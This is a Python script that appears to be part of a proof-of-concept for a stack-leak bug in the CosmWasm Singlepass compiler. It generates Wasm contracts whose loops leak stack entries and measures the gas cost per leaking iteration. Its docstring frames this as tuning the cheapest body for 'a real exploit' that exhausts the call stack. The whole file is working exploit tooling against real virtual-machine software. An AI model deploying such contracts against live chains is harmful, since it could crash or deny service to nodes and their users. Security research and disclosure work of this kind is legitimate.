#!/usr/bin/env python3
"""
Minimal gas cost of an iteration that leaks the Singlepass stack.

The earlier measurement (8,510 gas/iteration) used a loop body containing a
host call (CosmWasm charges `host_call_cost = 18,000` for every host call, plus
the DB read region cost of 200,000) and a mutable global write.  Both are
avoidable in a real exploit, so the marginal cost per leaking iteration has to
be measured again with the leanest possible body.

Variants:
  counter  : loop with only the counter            -> baseline cost
  leak0    : leaking if, no call, no global.set     -> cheapest possible
  leakN    : leaking if with N pushed values
  leakcall : leaking if + a call to an empty function
  leakhost : leaking if + a call to a host import

For each: gas per iteration and whether the stack is exhausted.
"""
import os
import sys
import tempfile

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)

import run_poc as R                              # noqa: E402
from wasm_builder import (                       # noqa: E402
    Module, I32, I64, op_i32_const, op_i64_const, op_nop, op_end, op_if, op_else,
    op_drop, op_call, op_local_get, op_local_set, op_local_tee, op_i32_sub,
    op_loop, op_global_get, op_global_set, op_br_if,
)

RESP = b'{"ok":{"messages":[],"attributes":[],"events":[],"data":null}}'


def build(kind, iterations, prefix=4):
    m = Module()
    m.add_memory(2, export="memory")
    db_read = m.add_import("env", "db_read", [I32], [I32])
    t_pass = m.add_type([I64], [I64])
    m.add_data(16, (64).to_bytes(4, "little") + len(RESP).to_bytes(4, "little")
               + len(RESP).to_bytes(4, "little"))
    m.add_data(64, RESP)
    m.add_data(1024, (2048).to_bytes(4, "little") + (4096).to_bytes(4, "little")
               + (0).to_bytes(4, "little"))
    g_val = m.add_global(I64, True, op_i64_const(0))
    empty = m.add_func([], [], body=op_nop())
    hostfn = m.add_func([], [], body=op_i32_const(1024) + op_call(db_read) + op_drop())

    b = bytearray()
    b += op_i32_const(iterations) + op_local_set(3)
    b += op_loop()
    if kind == "counter":
        pass
    else:
        for _ in range(prefix):
            b += op_local_get(0)
        b += op_local_get(0)          # the value passed as the block parameter
        b += op_local_get(1)          # condition (false -> implicit else)
        b += op_if(t_pass)
        b += op_end()
        if kind == "leakcall":
            b += op_call(empty)
        elif kind == "leakhost":
            b += op_call(hostfn)
        b += op_drop()                # discard the if result
        if kind == "leakglobal":
            b += op_global_set(g_val)
        for _ in range(prefix):
            b += op_drop()
    b += op_local_get(3) + op_i32_const(1) + op_i32_sub() + op_local_tee(3) + op_br_if(0)
    b += op_end()
    b += op_global_get(g_val)
    check = m.add_func([I64, I32, I64], [I64], locals=[I32], body=bytes(b))

    m.add_func([I32], [I32], body=op_i32_const(1024), export="allocate")
    m.add_func([I32], [], body=op_nop(), export="deallocate")
    m.add_func([I32, I32, I32], [I32], body=op_i32_const(16), export="instantiate")
    ex = bytearray()
    ex += op_i64_const(123) + op_i32_const(0) + op_i64_const(123)
    ex += op_call(check) + op_local_set(3)
    ex += op_i32_const(64) + op_local_get(3) + b"\x37\x03\x00"
    ex += op_i32_const(16)
    m.add_func([I32, I32, I32], [I32], locals=[I64], body=bytes(ex), export="execute")
    m.add_func([], [], body=op_nop(), export="interface_version_8")
    return m.build()


def run(kind, iterations, prefix=4):
    wasm = build(kind, iterations, prefix)
    base = tempfile.mkdtemp()
    vm = R.VM()
    cache = vm.init_cache(base)
    checksum = vm.store_code(cache, wasm, checked=True)
    vm.instantiate(cache, checksum, 1 << 62)
    res2, rep2, err2 = vm.execute(cache, checksum, 1 << 62)
    err = vm._vec_str(err2)
    v = "STACK-EXH" if "call stack exhausted" in err else ("ERR" if err else "ok")
    return v, rep2.used_internally


def main():
    print("Marginal gas per loop iteration and leak behaviour")
    print()
    print("%-10s %-6s %-12s %-12s %-14s %s"
          % ("kind", "prefix", "verdict@400k", "gas@20k", "gas@40k", "gas/iter"))
    print("-" * 82)
    for kind, prefix in (("counter", 0), ("leak0", 0), ("leak0", 1), ("leak0", 2),
                         ("leak0", 3), ("leak0", 4), ("leak0", 8),
                         ("leakglobal", 4), ("leakcall", 4), ("leakhost", 4)):
        v, _ = run(kind, 400000, prefix)
        _, g20 = run(kind, 20000, prefix)
        _, g40 = run(kind, 40000, prefix)
        gpi = (g40 - g20) / 20000.0 if g20 and g40 else 0
        print("%-10s %-6d %-12s %-12s %-14s %.1f"
              % (kind, prefix, v, g20, g40, gpi))
        sys.stdout.flush()


if __name__ == "__main__":
    main()
